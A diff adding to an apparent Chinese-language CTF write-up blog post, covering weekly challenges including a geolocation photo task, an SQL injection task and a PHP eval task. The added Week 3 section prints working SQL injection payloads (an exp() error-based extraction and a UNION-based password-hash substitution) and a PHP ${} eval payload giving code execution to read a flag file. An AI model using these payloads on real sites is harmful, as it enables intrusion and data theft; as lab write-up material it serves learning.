@@ -14,6 +14,7 @@ tags: ctf
 ### [旅行照片](https://compass.ctfd.io/challenges#Week1/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87-216)
 蓝色kfc....没了。当时绕着海岸线找了一圈面向南+桥+港口的组合，最后发现百度地图上好像少了一个岛。真的屑。
 
+
 ## Week 2
 ### [Calculat3 M3](https://compass.ctfd.io/challenges#Week2/Calculat3%20M3-229), a.k.a https://web.ctflearn.com/web7/
 很简单的一个题，除了我以为里面用的是`eval`...  
@@ -52,6 +53,27 @@ $query="SELECT * FROM users WHERE name=\'user\\' AND pass=\'".$password.'\';';
 *我又不是master，我怎么会做*  
 0 solve，不知道是神仙都做不出来还是不样神仙做题。反正我肯定不会，等听了题解再更新。
 
----
 
+## Week 3
+### [SQLI](https://compass.ctfd.io/challenges#Week3/SQLI-238)
+一眼mysql_error，去查了一下还真能注入...  
+然后网上随便找了个`' and exp(~(select * from (select pw from php)x)) #`。注入成功把flag打出来了，交上去提示不对。  
+问了问神仙，拿出来的可能是别的题的flag...草。真正的flag需要到echo "*******"那里。  
+echo前面用的是`!strcasecmp($pass, $row[pw])`判断密码。网上说给strcasecmp传数组会返回0，但$pass过了遍md5，没法用数组。  
+最后考虑到...反正随便注入，给`$row[pw]`换成自己想要的值就好了。
+构造的是user=`' union select "c4ca4238a0b923820dcc509a6f75849b" as pw #`, pass=`1`。c4ca那一串是1的md5。
+
+### [Reverse shell included](https://compass.ctfd.io/challenges#Week3/Reverse%20shell%20included-235)
+~~虽然名字叫Reverse shell但其实用不上反弹shell~~
+``` php
+$str=@(string)$_GET['str'];
+eval('$str="'.addslashes($str).'";');
+```
+这里用到了`${}`语法。php会先执行`${}`里写的函数，然后把返回值拼进字符串。  
+e.g. `?str=${phpinfo()}`会打出phpinfo。  
+不过有个问题，有addslashes，所以字符串需要...通过GET传进来。  
+最后构造的是`?str=${eval($_GET[1])}&1=echo%20file_get_contents($_GET[2]);&2=flag.php`。
+
+反弹shell...没成功。有空再试。
+---
 *未完待续*
